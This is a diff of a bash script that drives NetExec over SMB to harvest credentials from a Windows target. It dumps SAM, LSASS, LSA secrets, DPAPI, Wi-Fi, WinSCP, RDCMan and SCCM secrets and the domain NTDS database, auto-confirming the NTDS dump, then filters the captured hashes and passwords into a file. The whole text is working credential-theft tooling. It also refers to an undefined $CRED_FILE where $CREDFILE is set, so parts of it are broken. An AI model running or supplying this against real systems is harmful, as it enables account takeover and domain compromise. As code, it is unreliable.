@@ -49,7 +49,7 @@ elif [[ -n "$PASS" && -n "$HASH" ]]; then
   usage
 fi
 
-CREDFILE="$OUTDIR/credentials_raw.txt"
+CREDFILE="$OUTDIR/atm.log"
 mkdir -p "$OUTDIR"
 touch "$CREDFILE"
 
@@ -59,7 +59,7 @@ log() {
 
 run_nxc () {
   log "Running: $*"
-  $* | tee -a "$CREDFILE"
+  unbuffer $* | tee -a "$CREDFILE"
 }
 
 # build auth flags
@@ -75,19 +75,18 @@ log "Starting credential collection…"
 
 run_nxc nxc smb "$TARGET" $AUTH_ARGS --sam
 run_nxc nxc smb "$TARGET" $AUTH_ARGS -M lsassy
+run_nxc nxc smb "$TARGET" $AUTH_ARGS --lsa
 run_nxc nxc smb "$TARGET" $AUTH_ARGS --dpapi
 run_nxc nxc smb "$TARGET" $AUTH_ARGS -M wifi
 run_nxc nxc smb "$TARGET" $AUTH_ARGS -M winscp
 run_nxc nxc smb "$TARGET" $AUTH_ARGS -M rdcman
-run_nxc nxc smb "$TARGET" $AUTH_ARGS --lsa
-run_nxc nxc smb "$TARGET" $AUTH_ARGS --ntds
 run_nxc nxc smb "$TARGET" $AUTH_ARGS --sccm
+log "Running: nxc smb $TARGET $AUTH_ARGS --ntds"
+script -efqa "$CRED_FILE" -c 'printf "Y\n" | nxc smb $TARGET $AUTH_ARGS --ntds'
 
 # ──────── Extraction & Sorting ────────
 log "Extracting potential credential lines…"
-grep -Ei "(user|username|login|pass|password|hash|:[0-9a-f]{32,})" "$CREDFILE" \
-    | sed 's/\r$//' | sort -u \
-    > "$OUTDIR/credentials_unique.txt"
+awk -F '        ' '{print $NF}' $CRED_FILE | rg -a '^\x1b\[1;33m' | sed -r 's/\x1b\[[0-9;]*m//g' | sort -u > "atm.creds"
 
-echo -e "${GREEN}[✓] Raw output:        ${OUTDIR}/credentials_raw.txt"
-echo -e "${GREEN}[✓] Unique credentials: ${OUTDIR}/credentials_unique.txt"
+echo -e "${GREEN}[✓] Raw output:        ${OUTDIR}/atm.log"
+echo -e "${GREEN}[✓] Unique credentials: ${OUTDIR}/atm.creds"
